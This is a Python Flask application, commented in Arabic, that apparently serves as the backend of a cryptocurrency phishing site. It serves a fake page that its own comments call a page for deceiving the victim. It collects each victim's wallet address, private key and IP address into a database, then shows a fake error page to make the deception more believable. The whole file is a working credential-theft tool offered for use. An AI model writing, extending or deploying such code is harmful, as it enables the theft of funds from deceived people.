from flask import Flask, request, redirect, render_template
from database import insert_data
import os

app = Flask(__name__)

@app.route('/')
def serve_phishing_page():
    """ 🕵️‍♂️ عرض الصفحة الوهمية لخداع الضحية """
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def receive_data():
    """ 🎯 استقبال بيانات الضحية وحفظها في القاعدة """
    wallet = request.form.get('wallet')
    private_key = request.form.get('private_key')
    ip = request.remote_addr  # الحصول على عنوان IP للضحية

    if wallet and private_key:
        insert_data(wallet, private_key, ip)

    # 🔄 إعادة التوجيه إلى صفحة الخطأ الوهمية
    return redirect('/error')

@app.route('/error')
def error_page():
    """ 🚫 صفحة الخطأ الوهمية لزيادة المصداقية """
    return render_template('error.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
